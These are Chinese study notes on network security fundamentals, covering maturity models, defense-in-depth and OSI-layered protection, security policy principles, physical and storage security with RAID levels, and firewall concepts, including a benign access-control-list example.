- l4 Quantitatively Managed:量化标准和指标。
- l5 Optimizing:可持续化优化。

#### SSE-CMM
Systems Security Engineering Capability Maturity Model  
过程类别：工程Engineering，组织Organazation，项目过程Project  
22项过程列表。工程过程、风险过程、保证过程的相互关系。  
### 数据安全能力成熟度模型
数据安全能力从组织建设、制度流程、技术工具及人员能力四个维度评估。
### 软件安全能力成熟度
CMM1-5

7.22
---
### 纵深防御模型
多道保护线，相互支持和补救。  
- 第一道防线：安全保护。 
- 第二道防线：安全监测。
- 第三道防线：实时响应。
- 第四道防线：恢复。
### 分层防护模型
基于OSI七层模型的分层防护策略，每一层对应的安全措施和防护方法：

#### 物理层防护：

- 物理安全控制：确保数据中心和网络设备的物理安全，如门禁系统、视频监控。
- 环境控制：保护设备免受环境威胁，如温度、湿度和电力问题。
- 防止硬件篡改：使用防篡改设备和机柜锁。

#### 数据链路层防护：
节点间数据帧的传输和错误检测、纠正。包括媒体访问控制（MAC）地址和网络拓扑。
*数据链路层处理的是网络中的直接连接设备之间的通信，并管理这些设备的物理地址（如MAC地址）。*
- MAC地址过滤：限制网络设备之间的通信。
- VLAN隔离：通过虚拟局域网隔离不同的网络流量。  
    - VLAN（虚拟局域网）：是一种网络虚拟化技术，用于将一个物理网络划分为多个逻辑网络。每个VLAN是一个独立的广播域，即使它们共享相同的物理网络基础设施。  
    - VLAN技术主要在数据链路层操作，通过使用交换机来划分网络。交换机在数据链路层工作，处理和转发基于MAC地址的数据帧。
- ARP防护：防止地址解析协议攻击，如ARP欺骗。
    - ARP（地址解析协议）：在IPv4网络中，用于将IP地址映射到MAC地址。ARP请求和响应在局域网内广播，允许设备找到彼此的硬件地址。MAC地址是数据链路层的核心元素。

#### 网络层防护：
负责数据包的路由和转发，管理逻辑地址（如IP地址）。决定数据包如何通过多个网络传输到目的地。  
*包括IP（Internet Protocol）、ICMP（Internet Control Message Protocol）。*

- 路由安全：使用路由协议认证和过滤，防止路由表篡改。
- 防火墙：设置网络防火墙，控制进出网络的流量。
- IPsec：使用IPsec协议进行网络层加密，确保数据包的机密性和完整性。
    - IPsec是一个套件，包含多个协议（如AH（Authentication Header）和ESP（Encapsulating Security Payload）），这些协议用于在网络层上提供数据包的加密和验证。
    - IPsec通过在IP数据包的头部和有效载荷之间插入一个IPsec头部来实现其功能。它保护了网络层的数据包，无论数据包的内容是什么，应用层协议如何。所以属于网络层防护。
    - 为所有使用IP协议的数据包提供统一的安全保护，而不需要每个应用程序实现自己的安全机制。

#### 传输层防护：
传输层负责端到端的数据传输管理，确保数据在两个主机之间可靠传输。
它提供了数据流控制、错误检测与纠正、数据包排序等服务。
传输层的主要协议包括TCP（Transmission Control Protocol）和UDP（User Datagram Protocol）。

- 传输层加密：使用SSL/TLS协议加密传输层数据，确保数据在传输过程中机密性和完整性。
    - SSL（Secure Sockets Layer）。
    - TLS（Transport Layer Security），SSL的后继版本，改进了安全性和性能。
        - 加密数据传输：SSL/TLS加密传输层的数据，防止数据在传输过程中被窃听。
        - 数据完整性：使用消息认证码（MAC）确保数据在传输过程中未被篡改。
        - 身份验证：通过数字证书验证通信双方的身份，防止中间人攻击。
    - SSL和TLS直接在传输层协议（TCP）之上工作。
    - HTTPS是使用SSL/TLS保护的HTTP，而FTPS是使用SSL/TLS保护的FTP。*通过保护传输层数据，间接地为应用层协议提供安全服务。*
- 端口扫描防护：使用入侵检测和防御系统（IDS/IPS）检测和阻止端口扫描行为。
- 传输层协议过滤：在防火墙上配置规则，限制不必要的传输层协议（如TCP/UDP）的使用。

#### 会话层防护：
现代网络应用和协议通常将会话层和表示层的功能集成到应用层中。例如，HTTP协议不仅处理应用层的功能，还包括某些会话层和表示层的功能，如会话管理（Cookies）和数据格式化（MIME类型）。  
具体实现：许多协议和技术在实现时，会话层和表示层的功能已经被具体的技术和工具实现。例如，TLS/SSL协议虽然在表示层工作，但开发人员通常通过API（如OpenSSL库）直接使用，而不需要详细理解底层实现。
？TSL/SSL传输层？→加密功能类似

- 会话管理：使用安全会话管理技术，防止会话劫持和重放攻击。
- 会话超时：配置会话超时策略，自动终止长时间不活动的会话。
- 会话加密：在会话层实施加密，保护会话数据。

##### 会话层和表达层的技术
TLS/SSL：虽然主要被认为是传输层协议，但它也涉及会话管理和数据加密解密。
JSON和XML：作为数据格式化标准，属于表示层范畴，确保不同系统间的数据交换格式一致。
OAuth：作为认证协议，管理会话和令牌，属于会话层和应用层之间的功能。

#### 表示层防护：
数据格式化和转换：表示层负责数据的格式化、加密和解密，确保发送方和接收方能够正确理解数据。
数据压缩：表示层可以对数据进行压缩和解压缩，以提高传输效率。
数据加密：表示层可以对数据进行加密和解密，确保数据在传输过程中的安全性。
数据格式化协议：例如，JPEG和MPEG是用于图像和视频数据的格式化协议，表示层负责处理这些格式。

- 数据加密和解密：使用强加密算法对数据进行加密和解密，确保数据的机密性。
- 数据格式化安全：防止格式化数据时的安全漏洞，如防止恶意代码注入。
- 压缩和解压缩安全：确保压缩和解压缩过程的安全性，防止压缩文件中的恶意代码执行。

#### 应用层防护：
提供用户接口和应用服务，如HTTP、FTP、SMTP等。
直接与用户交互，处理高层协议的数据。

- 应用防火墙：使用Web应用防火墙（WAF）保护应用程序免受常见的应用层攻击，如SQL注入和跨站脚本（XSS）。
- 安全编码实践：开发人员遵循安全编码实践，减少应用层漏洞。
用户认证和授权：实施强用户认证和授权机制，确保只有授权用户才能访问应用程序。
- 漏洞扫描和渗透测试：定期对应用程序进行漏洞扫描和渗透测试，识别和修复安全漏洞。

7.23
---
### 等级保护模型
确定安全等级。  
确定对应的安全要求。
依据要求，平衡要求、成本、风险，规划、设计、实施和验收。

### 网络生存模型
“3R”：Resistance, Recognition, Recovery

## 网络安全体系建设原则与安全策略
### 网络安全原则
#### 系统性，动态性原则
“木桶原则”
##### 纵深防护与协作性原则
##### 网络安全风险和分级保护原则
正确处理需求、风险和代价的关系，安全性与可用性相容。  
分级保护原则指根据***网络资产的安全级别***，采取合适措施来保护网络资产。
##### 标准化与一致性
安全体系设计的一致性
##### 技术与管理相结合
##### 安全第一，预防为主原则
##### 业务与安全等同
##### 人机物融合和产业发展原则
### 网络安全策略
有关保护对象的网络安全规则和要求。  
一个网络安全策略文件应具备：
- 涉及范围
- 有效期
- 所有者
- 责任
- 参考文件
- 策略主题内容
- 复查
- 违规处理

# 第五章 物理环境安全技术
## 网络通信线路安全分析与防护
### 通信线路安全分析
网络通信线路被：1切断 2电磁干扰 3电磁信号泄密
### 安全防护
#### 网络通信设备
设备冗余（设备之间互为备份）
#### 网络通信线路
采取多路通信的方式  
如网络连接可以通过DDN专线和电话线。  
举例的ISP网络拓扑图，冗余解决办法+交换机和路由器交叉互联，ISP与外部网络连接有两个出口

## 存储介质安全分析与防护
### 安全分析
威胁：存储管理失控，存储数据泄密，存储介质及存储设备故障，存储介质数据非安全删除，恶意代码攻击。
### 安全防护
强化存储安全管理，数据存储加密保存，容错容灾存储技术（磁盘阵列，双机在线备份，离线备份）。  
##### 磁盘阵列
RAID, Redundant Array of Independent Disks。将多个物理硬盘驱动器组合成一个逻辑单元的技术，通过数据冗余和性能提升来提高存储系统的可靠性和效率。 
- RAID 0（条带化）：
    描述：数据在多个磁盘上条带化分布，未提供冗余。
    优点：读写性能高。
    缺点：没有数据冗余，一旦一个磁盘失败，所有数据都会丢失。

- RAID 1（镜像）：
    描述：数据在两个磁盘上完全复制，提供冗余。
    优点：数据冗余高，可靠性强。
    缺点：存储效率低（只有50%），写入性能稍低。

- RAID 5（分布式奇偶校验）：
    描述：数据和奇偶校验信息分布在多个磁盘上，需要至少三个磁盘。
    优点：提供数据冗余和较好的存储效率，读性能高。
    缺点：写入性能相对较低，恢复时间较长。

- RAID 6（双重奇偶校验）：
    描述：与RAID 5类似，但使用双重奇偶校验，需要至少四个磁盘。
    优点：能容忍两个磁盘同时失效。
    缺点：写入性能较低，恢复时间更长。

- RAID 10（条带化镜像）：
    描述：结合RAID 0和RAID 1的优点，条带化数据并在每个条带上进行镜像。
    优点：高性能和高冗余，读写性能优秀。
    缺点：存储效率较低，需要较多磁盘。

## 第五章小结
网络通信线路&存储介质安全的分析和防护

# 第八章 防火墙技术原理与应用
## 概念
### 安全区域划分
- Internet
- 内联网(Intranet)，公司/组织专用网络
- 外联网（Extranet），Intranet的扩展延伸，常用作组织与合作伙伴之间进行通信。
- 军事缓冲区域，DMZ，Demilitarized Zone  
在安全区域划分基础上，通过防火墙，控制安全区域间的通信，隔离有害通信，进而阻断网络攻击。  
一般安装在不同安全区域边界处，用于网路通信安全控制。

### 工作原理
软硬件组合而成的网络访问控制器，它根据一定的安全规则来控制流过防火墙的网络包，如禁止或转发，能屏蔽被保护网络内部的信息、拓扑结构和运行状况。  
防火墙根据网络包所提供的信息实现网络通信访问控制：如果网络通信包符合网络访问控制策略，就允许该网络通信包通过防火墙。
- 白名单策略
- 黑名单策略  

简单的可以用路由器、交换机实现。复杂的一组机器。  
防火墙访问控制可以作用于网络接口层（主要对应物理层和数据链路层）、网络层、传输层、应用层。  
如果没有防火墙，网络中的每台主机都要安装安全软件。
功能：
- 过滤非安全网络访问。
仅授权用户访问。
- 限制网络访问。
只允许外部网络访问受保护网络的指定主机或网络服务。（通常Mail，FTP，WWW服务器可让外网访问）
- 网络访问审计。
日志。可以掌握网络使用情况，网络通信带宽和访问外部网络的服务数据。防火墙日志也可用于入侵检测和网络攻击取证。
- 网络带宽控制。
防火墙可控制网络带宽的分配使用，实现部分网络质量服务QoS保障。
- 协同防御。
防火墙和IDS通过交换信息实现联动。

### 防火墙安全风险
#### 网络安全旁路
防火墙只对通过它的网络通信包进行访问控制。例如，从内部网络直接拨号访问外网。
#### 防火墙功能缺陷
- 不能完全防止感染病毒的软件或文件传输。
- 不能防止基于数据驱动式的攻击。
- 不能完全防止后门攻击。
#### 防火墙安全机制形成单点故障和特权威胁
若防火墙自身安全管理失效，就会对网络造成单点故障和网络安全特权失控。
#### 防火墙无法有效防范内部威胁
内网用户操作失误
#### 效用受限于安全规则
依赖规则更新，特别是采用黑名单策略的防火墙。
### 防火墙发展
#### 控制粒度变化
从IP地址信息到IP包内容
#### 检查功能持续增强
DPI deep packet inspection
用于检查网络通信中的数据包内容，而不仅仅是头部信息。DPI能够深入到每个数据包的负载部分（payload），以识别、分类和管理流量。
#### 产品分类更加细化
工控防火墙、Web防火墙、数据库/数据防火墙等
#### 智能化增强

## 防火墙类型和实现技术
### 包过滤 Packet Filtering Firewall
在ip层（网络层）实现的防火墙技术，通过检查数据包的源IP地址、目的IP地址、源端口、目的端口和协议类型来决定是否允许或拒绝这些数据包。  
##### 缺点：
只能基于包头信息进行过滤，无法检测数据包的内容和应用层协议。容易受到IP欺骗等攻击。
##### 实现技术：
使用访问控制列表（ACLs），根据预定义的规则集过滤数据包。
一个例子:
```
access-list 101 permit tcp 192.168.1.0 0.0.0.255 any eq 80
access-list 101 deny ip any any
```
这段配置允许来自192.168.1.0/24网络的所有主机访问任何目的主机的HTTP服务（端口80），并拒绝所有其他流量。
